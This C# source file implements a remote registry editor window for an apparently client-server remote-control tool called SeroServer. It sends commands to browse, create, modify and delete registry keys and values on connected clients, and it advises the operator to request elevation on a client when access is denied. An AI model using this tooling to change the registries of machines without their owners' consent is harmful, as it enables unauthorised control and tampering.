using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class RegValueVM
{
    public string Name      { get; set; } = "";
    public string ValueType { get; set; } = "";
    public string Data      { get; set; } = "";
}

public class RegKeyNode
{
    public string FullPath   { get; set; } = "";
    public string Name       { get; set; } = "";
    public bool   IsRoot     { get; set; }
    public bool   IsLoaded   { get; set; }
}

public partial class RegistryEditorWindow : ThemedWindow
{
    private readonly TlsServer  _server;
    private readonly string     _clientId;
    private readonly ObservableCollection<RegValueVM> _values = [];
    private string _currentPath = "";

    // Root hives
    private static readonly string[] _roots = ["HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_CLASSES_ROOT", "HKEY_USERS"];

    private static readonly SolidColorBrush _brushRoot  = Freeze(new SolidColorBrush(Color.FromRgb(0xAA, 0xB8, 0xF0)));
    private static readonly SolidColorBrush _brushChild = Freeze(new SolidColorBrush(Color.FromRgb(0xCC, 0xD0, 0xE8)));
    private static readonly SolidColorBrush _brushDim   = Freeze(new SolidColorBrush(Color.FromRgb(0x30, 0x38, 0x58)));
    private static readonly SolidColorBrush _brushLoad  = Freeze(new SolidColorBrush(Color.FromRgb(0x40, 0x48, 0x68)));
    private static SolidColorBrush Freeze(SolidColorBrush b) { b.Freeze(); return b; }

    public RegistryEditorWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;
        GridValues.ItemsSource = _values;
        RubberBandSelector.Enable(GridValues);

        _server.RegisterHandler(clientId, PacketType.RegChildrenResult, OnChildren);
        _server.RegisterHandler(clientId, PacketType.RegAck, OnAck);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.RegChildrenResult);
            _server.UnregisterHandler(clientId, PacketType.RegAck);
            Lang.LanguageChanged -= ApplyLanguage;
        };

        BuildRootNodes();
    }

    // ── Tree building ─────────────────────────────────────────────────────────

    private void ApplyLanguage()
    {
        this.Title = Lang.Get("FEAT_REGISTRY_EDITOR");
        if (MnuRegNewKey    != null) MnuRegNewKey.Header    = Lang.Get("ACT_NEW_KEY");
        if (MnuRegDeleteKey != null) MnuRegDeleteKey.Header = Lang.Get("ACT_DELETE_KEY");
        if (MnuRegRefresh   != null) MnuRegRefresh.Header   = Lang.Get("ACT_REFRESH");
        if (MnuRegEditVal   != null) MnuRegEditVal.Header   = Lang.Get("ACT_EDIT_VALUE");
        if (MnuRegDeleteVal != null) MnuRegDeleteVal.Header = Lang.Get("ACT_DELETE_VALUE");
        if (MnuRegNewVal    != null) MnuRegNewVal.Header    = Lang.Get("ACT_NEW_VALUE");
    }

    private void BuildRootNodes()
    {
        RegTree.Items.Clear();
        foreach (var root in _roots)
        {
            var item = MakeTreeItem(root, root, isRoot: true);
            RegTree.Items.Add(item);
        }
    }

    private TreeViewItem MakeTreeItem(string name, string fullPath, bool isRoot = false)
    {
        var item = new TreeViewItem
        {
            Tag = new RegKeyNode { FullPath = fullPath, Name = name, IsRoot = isRoot }
        };

        // Header: folder icon + name
        var panel = new StackPanel { Orientation = System.Windows.Controls.Orientation.Horizontal };
        panel.Children.Add(new TextBlock
        {
            Text = "📁", FontSize = 11,
            VerticalAlignment = VerticalAlignment.Center,
            Margin = new Thickness(0, 0, 5, 0)
        });
        panel.Children.Add(new TextBlock
        {
            Text = name,
            Foreground = isRoot ? _brushRoot : _brushChild,
            VerticalAlignment = VerticalAlignment.Center
        });
        item.Header = panel;

        // Dummy child so the expand arrow appears
        item.Items.Add(new TreeViewItem { Header = "⌛ Loading…", Foreground = _brushLoad });
        item.Expanded += TreeItem_Expanded;
        return item;
    }

    private TreeViewItem? _pendingExpand;

    private void TreeItem_Expanded(object s, RoutedEventArgs e)
    {
        if (s is not TreeViewItem item) return;
        if (item.Tag is not RegKeyNode node) return;
        if (node.IsLoaded) return;

        _pendingExpand = item;
        RequestChildren(node.FullPath);
        e.Handled = true;
    }

    private void RegTree_SelectedItemChanged(object s, RoutedPropertyChangedEventArgs<object> e)
    {
        if (RegTree.SelectedItem is not TreeViewItem item) return;
        if (item.Tag is not RegKeyNode node) return;
        _currentPath = node.FullPath;
        TxtPath.Text = _currentPath;
        // Skip if TreeItem_Expanded already sent this request (node not yet loaded)
        if (!node.IsLoaded) return;
        RequestChildren(_currentPath);
    }

    private void RequestChildren(string path)
    {
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegGetChildren,
            Data = JsonConvert.SerializeObject(new RegGetChildrenData { KeyPath = path })
        });
    }

    // ── Incoming packets ──────────────────────────────────────────────────────

    private void OnChildren(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<RegChildrenResultData>(pkt.Data);
            if (d == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (!string.IsNullOrEmpty(d.Error))
                {
                    TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), d.Error);
                    return;
                }

                _currentPath = d.KeyPath;
                TxtPath.Text  = _currentPath;

                // Update values grid
                _values.Clear();
                foreach (var v in d.Values)
                    _values.Add(new RegValueVM { Name = string.IsNullOrEmpty(v.Name) ? "(Default)" : v.Name, ValueType = v.ValueType, Data = v.Data });

                TxtStatus.Text = string.Format(Lang.Get("REG_LOADED"), d.SubKeys.Count, d.Values.Count, _currentPath);

                // Populate tree: find the item that requested this
                PopulateTreeItem(d.KeyPath, d.SubKeys);
            });
        }
        catch { }
    }

    private void PopulateTreeItem(string keyPath, List<string> subKeys)
    {
        // Find the TreeViewItem matching this path
        var item = FindTreeItem(RegTree.Items, keyPath);
        if (item == null) return;
        if (item.Tag is RegKeyNode node) node.IsLoaded = true;

        item.Items.Clear();
        foreach (var sub in subKeys)
        {
            var childPath = keyPath.TrimEnd('\\') + "\\" + sub;
            item.Items.Add(MakeTreeItem(sub, childPath));
        }
        if (subKeys.Count == 0)
            item.Items.Add(new TreeViewItem { Header = "  (empty)", Foreground = _brushDim, IsHitTestVisible = false });
    }

    private static TreeViewItem? FindTreeItem(ItemCollection items, string path)
    {
        foreach (var obj in items)
        {
            if (obj is not TreeViewItem tvi) continue;
            if (tvi.Tag is RegKeyNode node && node.FullPath.Equals(path, StringComparison.OrdinalIgnoreCase))
                return tvi;
            var found = FindTreeItem(tvi.Items, path);
            if (found != null) return found;
        }
        return null;
    }

    private void OnAck(Packet pkt)
    {
        try
        {
            var d = JsonConvert.DeserializeObject<RegAckData>(pkt.Data);
            if (d == null) return;
            Dispatcher.BeginInvoke(() =>
            {
                if (d.Success)
                {
                    TxtStatus.Text = Lang.Get("REG_SUCCESS");
                    // Reload current path
                    if (_pendingExpand?.Tag is RegKeyNode n) n.IsLoaded = false;
                    RequestChildren(_currentPath);
                }
                else
                {
                    var msg = d.Error;
                    // Hint for access denied
                    if (msg.Contains("Access", StringComparison.OrdinalIgnoreCase) ||
                        msg.Contains("denied", StringComparison.OrdinalIgnoreCase) ||
                        msg.Contains("Unauthorized", StringComparison.OrdinalIgnoreCase))
                    {
                        MessageBox.Show(
                            $"Access denied.\n\nThis key requires admin privileges.\nRequest elevation on the client first.\n\nError: {msg}",
                            Lang.Get("REG_ADMIN_REQUIRED"), MessageBoxButton.OK, MessageBoxImage.Warning);
                    }
                    else
                    {
                        TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), msg);
                    }
                }
            });
        }
        catch { }
    }

    // ── Actions ───────────────────────────────────────────────────────────────

    private void BtnGo_Click(object s, RoutedEventArgs e) => RequestChildren(TxtPath.Text.Trim());
    private void TxtPath_KeyDown(object s, KeyEventArgs e) { if (e.Key == Key.Enter) RequestChildren(TxtPath.Text.Trim()); }
    private void TreeRefresh_Click(object s, RoutedEventArgs e) => RequestChildren(_currentPath);

    private void BtnNewKey_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(_currentPath)) return;
        var name = SimpleInput(Lang.Get("REG_NEW_KEY"));
        if (string.IsNullOrWhiteSpace(name)) return;
        var key = _currentPath.TrimEnd('\\') + "\\" + name;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegCreateKey,
            Data = JsonConvert.SerializeObject(new RegCreateKeyData { KeyPath = key })
        });
        ServerWindow.ReportGlobalActivity("Create registry key", name, "complete");
        ServerWindow.LogGlobal($"[REG] Created registry key '{key}' on client {_clientId}.");
    }

    private void BtnNewValue_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(_currentPath)) return;
        var name = SimpleInput(Lang.Get("REG_VALUE_NAME"));
        if (string.IsNullOrWhiteSpace(name)) return;
        var data = SimpleInput($"Data for \"{name}\":", "") ?? "";
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegSetValue,
            Data = JsonConvert.SerializeObject(new RegSetValueData { KeyPath = _currentPath, Name = name, ValueType = "REG_SZ", Data = data })
        });
        ServerWindow.ReportGlobalActivity("Set registry value", name, "complete");
        ServerWindow.LogGlobal($"[REG] Set registry value '{name}' = '{data}' (type: REG_SZ) under '{_currentPath}' on client {_clientId}.");
    }

    private void BtnDeleteKey_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(_currentPath)) return;
        var result = MessageBox.Show(
            $"⚠️  Delete registry key?\n\n{_currentPath}\n\nThis will permanently delete the key and ALL sub-keys and values.\nThis action cannot be undone.",
            Lang.Get("REG_CONFIRM_KEY"), MessageBoxButton.YesNo, MessageBoxImage.Warning);
        if (result != MessageBoxResult.Yes) return;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegDeleteKey,
            Data = JsonConvert.SerializeObject(new RegDeleteKeyData { KeyPath = _currentPath })
        });
        ServerWindow.ReportGlobalActivity("Delete registry key", _currentPath.Split('\\').Last(), "complete");
        ServerWindow.LogGlobal($"[REG] Deleted registry key '{_currentPath}' on client {_clientId}.");
    }

    private void BtnDeleteValue_Click(object s, RoutedEventArgs e)
    {
        if (GridValues.SelectedItem is not RegValueVM vm) return;
        var result = MessageBox.Show(
            $"Delete value \"{vm.Name}\"?\n\nKey: {_currentPath}",
            Lang.Get("REG_CONFIRM_VAL"), MessageBoxButton.YesNo, MessageBoxImage.Warning);
        if (result != MessageBoxResult.Yes) return;
        var valName = vm.Name == "(Default)" ? "" : vm.Name;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegDeleteValue,
            Data = JsonConvert.SerializeObject(new RegDeleteValueData { KeyPath = _currentPath, Name = valName })
        });
        ServerWindow.ReportGlobalActivity("Delete registry value", vm.Name, "complete");
        ServerWindow.LogGlobal($"[REG] Deleted registry value '{valName}' under '{_currentPath}' on client {_clientId}.");
    }

    private void EditValue_Click(object s, RoutedEventArgs e) => EditSelectedValue();
    private void GridValues_DoubleClick(object s, MouseButtonEventArgs e) => EditSelectedValue();
    private void EditSelectedValue()
    {
        if (GridValues.SelectedItem is not RegValueVM vm || string.IsNullOrEmpty(_currentPath)) return;
        var newData = SimpleInput($"Edit  \"{vm.Name}\"  [{vm.ValueType}]:", vm.Data);
        if (newData == null || newData == vm.Data) return;
        var valName = vm.Name == "(Default)" ? "" : vm.Name;
        _ = _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.RegSetValue,
            Data = JsonConvert.SerializeObject(new RegSetValueData
            {
                KeyPath   = _currentPath,
                Name      = valName,
                ValueType = vm.ValueType,
                Data      = newData
            })
        });
        ServerWindow.ReportGlobalActivity("Set registry value", vm.Name, "complete");
        ServerWindow.LogGlobal($"[REG] Set registry value '{valName}' = '{newData}' (type: {vm.ValueType}) under '{_currentPath}' on client {_clientId}.");
    }

    // ── Input dialog ──────────────────────────────────────────────────────────

    private string? SimpleInput(string prompt, string? def = null)
    {
        static Brush R(string key, Color fallback) =>
            Application.Current.TryFindResource(key) as Brush
            ?? new SolidColorBrush(fallback);

        var dlg = new Window
        {
            Title = Lang.Get("DLG_REG_TITLE"), Width = 420, Height = 130,
            WindowStartupLocation = WindowStartupLocation.CenterOwner,
            Owner = this,
            ResizeMode = ResizeMode.NoResize, WindowStyle = WindowStyle.ToolWindow,
            Background = R("WindowBgBrush", Color.FromRgb(0x0C, 0x0D, 0x18))
        };
        var sp  = new StackPanel { Margin = new Thickness(14) };
        var lbl = new System.Windows.Controls.TextBlock { Text = prompt, Foreground = R("FieldLabelBrush", Colors.White), Margin = new Thickness(0,0,0,7), FontFamily = new System.Windows.Media.FontFamily("Segoe UI"), FontSize = 12 };
        var txt = new System.Windows.Controls.TextBox   { Text = def ?? "", Background = R("InputBgBrush", Color.FromRgb(0x0A, 0x0C, 0x1C)), Foreground = R("ContentTextBrush", Colors.White), BorderBrush = R("AccentBrush", Color.FromRgb(0x4A, 0x85, 0xF5)), BorderThickness = new Thickness(1), Padding = new Thickness(6, 5, 6, 5), Margin = new Thickness(0,0,0,10), FontFamily = new System.Windows.Media.FontFamily("Consolas"), FontSize = 11 };
        var btn = new System.Windows.Controls.Button    { Content = Lang.Get("DLG_OK"), Width = 80, HorizontalAlignment = HorizontalAlignment.Right, Background = R("AccentBrush", Color.FromRgb(0x4A, 0x85, 0xF5)), Foreground = Brushes.White, BorderThickness = new Thickness(0), Padding = new Thickness(0, 6, 0, 6) };
        btn.Click += (_, _) => dlg.DialogResult = true;
        txt.KeyDown += (_, ke) => { if (ke.Key == Key.Enter) dlg.DialogResult = true; };
        sp.Children.Add(lbl); sp.Children.Add(txt); sp.Children.Add(btn);
        dlg.Content = sp;
        txt.SelectAll(); txt.Focus();
        return dlg.ShowDialog() == true ? txt.Text : null;
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void RegTree_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (RegTree.SelectedItem == null) e.Handled = true;
    }

    private void GridValues_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (RegTree.SelectedItem == null) e.Handled = true;
    }
}
